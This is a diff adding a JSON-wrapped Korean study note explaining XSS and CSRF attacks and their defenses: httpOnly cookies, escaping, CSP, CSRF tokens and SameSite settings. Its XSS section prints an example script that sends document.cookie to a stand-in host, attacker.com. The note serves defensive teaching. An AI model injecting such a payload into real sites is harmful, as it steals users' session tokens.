@@ -1,0 +1,12 @@
+{
+  "slug": "xss-csrf",
+  "title": "XSS와 CSRF",
+  "category": "security",
+  "tags": ["보안", "웹보안", "쿠키", "XSS", "CSRF"],
+  "summary": "웹 보안 공격 두 가지. XSS는 쿠키를 읽는 공격, CSRF는 쿠키를 이용한 요청 위조",
+  "thumbnail": "",
+  "date": "2025-09-05",
+  "updatedAt": "2025-09-05T09:00:00.000000+00:00",
+  "content": "# XSS와 CSRF\n\n## XSS (Cross-Site Scripting)\n악성 스크립트를 웹사이트에 주입하여 쿠키/토큰을 **읽는** 공격\n\n### 공격 방식\n```html\n<script>\n  fetch('https://attacker.com?token=' + document.cookie)\n</script>\n```\n입력 필드(댓글 등)에 스크립트를 삽입하면, 다른 사용자의 브라우저에서 실행됨\n\n### 방어\n- httpOnly 쿠키 → JavaScript로 접근 불가\n- 입력값 이스케이프 처리 (HTML 엔티티 변환)\n- CSP(Content Security Policy) 헤더 설정\n\n## CSRF (Cross-Site Request Forgery)\n사용자 모르게 요청을 위조하는 공격. 쿠키를 **사용하는** 공격\n\n### 공격 방식\n1. 사용자가 서비스에 로그인된 상태\n2. 해커가 만든 페이지 방문 (링크 클릭 유도)\n3. 해커 페이지가 서비스에 요청을 몰래 전송\n4. 브라우저가 쿠키를 자동으로 포함 → 서버는 정상 요청으로 인식\n\nhttpOnly로는 방어 불가 (JavaScript가 읽는 것이 아니라 브라우저가 자동 첨부하는 것)\n\n### 방어 방법 1 - CSRF 토큰\n서버가 랜덤 토큰을 발급 → 요청 시 헤더에 포함 → 서버가 검증.\n공격자는 토큰 값을 알 수 없으므로 위조 요청을 만들 수 없음\n\n### 방어 방법 2 - SameSite 쿠키\n- `Strict` — 다른 사이트에서의 요청에 쿠키를 완전히 차단\n- `Lax` — GET은 허용, POST/PUT/DELETE는 차단 → 실무에서 보편적\n- `None` — 모두 허용 → CSRF에 취약\n\n## 비교 정리\n| | XSS | CSRF |\n|---|---|---|\n| 공격 대상 | 쿠키/토큰을 **읽음** | 쿠키를 **이용**한 요청 위조 |\n| 핵심 방어 | httpOnly 쿠키, CSP | CSRF 토큰, SameSite=Lax |",
+  "sourcePath": "notes/XSS-CSRF.md"
+}
